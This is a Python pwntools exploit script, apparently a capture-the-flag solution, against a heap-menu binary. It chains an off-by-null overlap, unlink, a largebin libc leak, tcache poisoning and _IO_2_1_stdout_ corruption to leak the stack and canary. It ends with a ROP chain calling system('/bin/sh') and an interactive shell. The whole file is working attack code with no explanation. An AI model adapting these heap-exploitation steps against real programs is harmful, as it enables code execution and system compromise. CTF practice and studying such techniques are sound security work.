#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


def cmd(choice):
    ru(b">> \n")
    sl(i2b(choice))


def add(size, data=b""):
    cmd(1)
    ru(b"input your name size\n")
    sl(i2b(size))
    ru(b"input your name\n")
    if len(data) < size:
        data += b"\n"
    s(data)


def edit(idx, size, data):
    cmd(2)
    ru(b"input index\n")
    sl(i2b(idx))
    ru(b"input your name size\n")
    sl(i2b(size))
    ru(b"input your name\n")
    if len(data) < size:
        data += b"\n"
    s(data)


def show(idx):
    cmd(3)
    ru(b"input index\n")
    sl(i2b(idx))


def delet(idx):
    cmd(4)
    ru(b"input index\n")
    sl(i2b(idx))


ru(b"and this line will make the game easier\n")
heap_addr = int(ru(b"\n", drop=True), 16) & (-1 << 12)
lg_suc("heap_addr", heap_addr)

lg_inf("constructing overlap")
add(0x408)
add(0x4F8)
add(0x408)
add(0x408)
add(0x408)
lg_inf("off by null")
edit(
    0,
    0x408,
    flat(
        {
            0x00: [
                heap_addr + 0x2B0,
                heap_addr + 0x2B0,
            ],
            0x400: 0x410,
        },
        filler=b"\x00",
    ),
)
lg_inf("unlink")
delet(1)
lg_err("Cant leak for \\x00")
lg_inf("putting evil chunk into largebin")
add(0x478)
add(0x488)
delet(1)
add(0x500)
show(0)
libc_base = u64_ex(rn(6)) - 0x1FF110
lg("libc_base", libc_base)

lg_inf("Trying tcache")
add(0x408)  # 6
delet(3)
delet(6)
edit(0, 0x408, p64((heap_addr >> 12) ^ heap_addr + 0x10))
add(0x408)  # 3
add(  # 6
    0x408,
    flat(
        {
            0x78: 0x7000000000000,
            0x278: libc_base + libc.sym._IO_2_1_stdout_,
        },
        filler=b"\x00",
    ),
)
add(
    0x408,
    p64(0xFBAD1800)
    + p64(0) * 3
    + p64(libc_base + libc.sym.environ)
    + p64(libc_base + libc.sym.environ + 8) * 2
    + p64(libc_base + libc.sym._IO_2_1_stdout_ + 131)
    + p64(libc_base + libc.sym._IO_2_1_stdout_ + 132),
)
stack_base = u64_ex(rn(6)) - 0x180
lg("stack_base", stack_base)


def cmd(choice):
    ru(b">>")
    sl(i2b(choice))


def add(size, data=b""):
    cmd(1)
    ru(b"input your name size")
    sl(i2b(size))
    ru(b"input your name")
    if len(data) < size:
        data += b"\n"
    s(data)


def edit(idx, size, data):
    cmd(2)
    ru(b"input index")
    sl(i2b(idx))
    ru(b"input your name size")
    sl(i2b(size))
    ru(b"input your name")
    if len(data) < size:
        data += b"\n"
    s(data)


def show(idx):
    cmd(3)
    ru(b"input index")
    sl(i2b(idx))


def delet(idx):
    cmd(4)
    ru(b"input index")
    sl(i2b(idx))


def orb_malloc(target, data):
    edit(
        6,
        0x408,
        flat(
            {
                0x78: 0x7000000000000,
                0x278: target,
            },
            filler=b"\x00",
        ),
    )
    add(0x408, data)


orb_malloc(
    libc_base + libc.sym._IO_2_1_stdout_,
    p64(0xFBAD1800)
    + p64(0) * 3
    + p64(stack_base + 0x10)
    + p64(stack_base + 0x10 + 8) * 2
    + p64(libc_base + libc.sym._IO_2_1_stdout_ + 131)
    + p64(libc_base + libc.sym._IO_2_1_stdout_ + 132),
)
canary = u64_ex(rn(8))
lg("canary", canary)

orb_malloc(
    stack_base + 8,
    flat(
        [
            0xDEADBEEF,
            canary,
            stack_base,
            libc_base + 0x0000000000028715 + 1,
            libc_base + 0x0000000000028715,
            libc_base + next(libc.search(b"/bin/sh\x00")),
            libc_base + libc.sym.system,
        ],
        filler=b"\x00",
    ),
)


ia()
